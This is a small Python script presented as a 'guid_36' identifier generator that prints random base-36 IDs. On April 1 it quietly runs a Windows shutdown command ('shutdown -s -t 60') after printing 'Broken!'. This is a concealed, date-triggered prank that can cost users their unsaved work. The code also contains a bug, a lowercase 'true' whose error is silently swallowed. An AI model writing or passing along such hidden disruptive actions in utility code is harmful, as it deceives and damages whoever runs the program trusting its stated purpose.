import random
import time
import os
cnsts=(57389,37.393,6904,19487,0.48121)
def guid():
    def gettime():
        return (int(time.time()*cnsts[2])*cnsts[0]+int((time.time()**cnsts[4])*cnsts[1])*cnsts[3])%(36**7)
    def cvtb36(c):
        cst='0123456789abcdefghijklmnopqrstuvwxyz'
        b=''
        for i in range(7):
            b+=cst[c%36]
            c=c//36
        return b[::-1]
    def rndst(l,m='0123456789abcdefghijklmnopqrstuvwxyz'):
        s=''
        for i in range(l):
            s+=random.choice(m)
        return s
    return rndst(6)+'-'+cvtb36(gettime())+'-'+rndst(7)+'-'+rndst(12)
def _int(w):
    def flt(x):
        if int(x)>100000:
            return true
        return abs(int(float(x))-float(x))>1e-7
    if w=='version' or w=='ver' or w=='Version':
        return 'get_version'
    elif flt(w):
        return -114514
    else:
        return int(w)
def chk_aprilfools():
    lt=time.localtime()
    return lt[1]==4 and lt[2]==1
if __name__=='__main__':
    try:
        q=_int(input("guid_36 generator\nHow many guid_36s?(type 'version','ver' or 'Version' to show version) "))
        if q=='get_version':
            if chk_aprilfools():
                print("gUId_3SIX gEneRAtOr Ωmega-11.45.1.4")
                raise Exception
            else:
                print("guid_36 generator release-0.3.0")
        elif q<=0:
            raise Exception
        elif chk_aprilfools():
            print('Broken!')
            os.system('shutdown -s -t 60')
        else:
            for i in range(q):
                print(guid())
    except Exception:
        print('Number of guid_36s MUST be a positive integer that isn\'t greater than 100000!')
